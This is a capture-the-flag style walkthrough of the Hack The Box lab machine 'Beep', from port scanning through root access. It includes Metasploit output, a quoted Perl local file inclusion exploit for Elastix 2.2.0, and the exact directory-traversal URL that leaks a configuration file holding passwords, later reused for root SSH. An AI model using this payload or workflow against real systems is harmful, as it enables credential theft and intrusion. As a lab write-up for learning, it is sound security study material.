# Title: Beep
Date: 2019-10-20

## Enumeration

As always, scan for open ports first...

	$ nmap -A -T4 beep
	Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 22:28 CDT
	Nmap scan report for beep (10.10.10.7)
	Host is up (0.037s latency).
	Not shown: 988 closed ports
	PORT      STATE SERVICE    VERSION
	22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
	|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
	25/tcp    open  smtp       Postfix smtpd
	|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
	80/tcp    open  http       Apache httpd 2.2.3
	|_http-server-header: Apache/2.2.3 (CentOS)
	|_http-title: Did not follow redirect to https://beep/
	|_https-redirect: ERROR: Script execution failed (use -d to debug)
	110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
	|_pop3-capabilities: RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) UIDL USER AUTH-RESP-CODE APOP PIPELINING TOP IMPLEMENTATION(Cyrus POP3 server v2) STLS
	111/tcp   open  rpcbind    2 (RPC #100000)
	143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
	|_imap-capabilities: Completed UNSELECT RIGHTS=kxte OK URLAUTHA0001 NO X-NETSCAPE LIST-SUBSCRIBED LISTEXT QUOTA STARTTLS IMAP4 IDLE BINARY CATENATE MULTIAPPEND THREAD=REFERENCES UIDPLUS RENAME SORT=MODSEQ ACL MAILBOX-REFERRALS SORT CONDSTORE ANNOTATEMORE LITERAL+ ID NAMESPACE CHILDREN IMAP4rev1 ATOMIC THREAD=ORDEREDSUBJECT
	443/tcp   open  ssl/https?
	|_ssl-date: 2019-10-17T03:27:36+00:00; -4m04s from scanner time.
	993/tcp   open  ssl/imap   Cyrus imapd
	|_imap-capabilities: CAPABILITY
	995/tcp   open  pop3       Cyrus pop3d
	3306/tcp  open  mysql      MySQL (unauthorized)
	4445/tcp  open  upnotifyp?
	10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
	|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
	Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
	
	Host script results:
	|_clock-skew: -4m04s
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 350.40 seconds

A lot of things listening here. The webserver was running Elastix, an open source PBX (Private Branch Exchange...phone stuff).

I took a look at the SMTP server with __metasploit__:

	msf5 auxiliary(scanner/smtp/smtp_enum) > run

	[*] 10.10.10.7:25         - 10.10.10.7:25 Banner: 220 beep.localdomain ESMTP Postfix
	[+] 10.10.10.7:25         - 10.10.10.7:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
	[*] beep:25               - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed

Nothing super useful there. I tried several other things with other open ports that I didn't take note of because they led nowhere. I also ran __dirb__ against the webserver but kept getting errors - I think this was likely because the cert is expired on this box (it was a retired htb machine while I was working on it).

I then tried __dirbuster__ and was able to get it running without a hitch. There are lots of interesting directories and after all of the enumeration to this point it is more than clear that this is a telephony server. Kinda cool. In a past life I managed a PBX and it was kind of neat just because the tech was so, uhh, ancient and straighforward.

Anyway, I kicked off a scan using the 
_/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt_
wordlist and came up with some interesting finds - vtigercrm being the one of most interest after looking into some of the others.

<img src="https://raw.githubusercontent.com/chadpierce/htb/master/beep/dirbuster-results.png" alt="dirbuster results" width="600"/>

## Exploitation

VTiger looked to be an opensource CRM - interesting - and the login page helpfully lets you know you're looking at version 5.1.0. I searched for exploits in __metasploit__ and came up with this:

	msf5 exploit(multi/http/vtiger_soap_upload) > run
	
	[*] Started reverse TCP handler on 10.10.14.23:4444 
	[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
	[*] Exploit completed, but no session was created.
	msf5 exploit(multi/http/vtiger_soap_upload) >

I thought this exploit should work, but was failing because of the bad ssl cert on the box that gave me issues with __dirb__.
Before sinking too much time into that I ran __searchsploit__ on Elastix. 

	msf5 exploit(multi/http/vtiger_soap_upload) > searchsploit elastix
	[*] exec: searchsploit elastix
	
	--------------------------------------- ----------------------------------------
	 Exploit Title                         |  Path
	                                       | (/usr/share/exploitdb/)
	--------------------------------------- ----------------------------------------
	Elastix - 'page' Cross-Site Scripting  | exploits/php/webapps/38078.py
	Elastix - Multiple Cross-Site Scriptin | exploits/php/webapps/38544.txt
	Elastix 2.0.2 - Multiple Cross-Site Sc | exploits/php/webapps/34942.txt
	Elastix 2.2.0 - 'graph.php' Local File | exploits/php/webapps/37637.pl
	Elastix 2.x - Blind SQL Injection      | exploits/php/webapps/36305.txt
	Elastix < 2.5 - PHP Code Injection     | exploits/php/webapps/38091.php
	FreePBX 2.10.0 / Elastix 2.2.0 - Remot | exploits/php/webapps/18650.py
	--------------------------------------- ----------------------------------------
	Shellcodes: No Result

The first few results are Cross Site Scripting, which wont help us here, the 4th I took a look at:

	msf5 exploit(multi/http/vtiger_soap_upload) > searchsploit -p 37637
	[*] exec: searchsploit -p 37637
	
	  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
	      URL: https://www.exploit-db.com/exploits/37637
	     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
	File Type: ASCII text, with CRLF line terminators

Here is a snippet of the code:

	print "\t Elastix 2.2.0 LFI Exploit \n";
	print "\t code author cheki   \n";
	print "\t 0day Elastix 2.2.0  \n";
	print "\t email: anonymous17hacker{}gmail.com \n";
	
	#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
	
	use LWP::UserAgent;
	print "\n Target: https://ip ";
	chomp(my $target=<STDIN>);
	$dir="vtigercrm";
	$poc="current_language";
	$etc="etc";
	$jump="../../../../../../../..//";
	$test="amportal.conf%00";

I tried loading the path in the code in a browser and found what's in the screenshot below. The word password shows up quite a bit, along with what looks like a password.

<img src="https://raw.githubusercontent.com/chadpierce/htb/master/beep/passwords-galore.png" alt="passwords galore" width="600"/>

## I'm In

I tried the password on a few of the web logins, and then on the console. It actually worked with root and I got a shell.

	$ ssh root@beep
	root@beep's password: 
	 
	Last login: Sun Oct 20 19:21:30 2019 from 10.10.x.x
	
	Welcome to Elastix 
	----------------------------------------------------
	
	To access your Elastix System, using a separate workstation (PC/MAC/Linux)
	Open the Internet Browser using the following URL:
	http://10.10.10.7
	
	[root@beep ~]# 

The user and root flags were in the expected places. 

## Endnotes

I think this box would have been easier if it weren't retired and the ssl certs were not also bad. It'd be cool if the HTB admins would fix that. But the other exploit I came across using __searchsploit__ was pretty cool to find. I expect that password reuse is what gave me root so easily. 

The hardest part of this box was that there was so much to sift through. On the other hand, if I'd searched for more Elastix exploits first thing I'd probably have solved it faster.










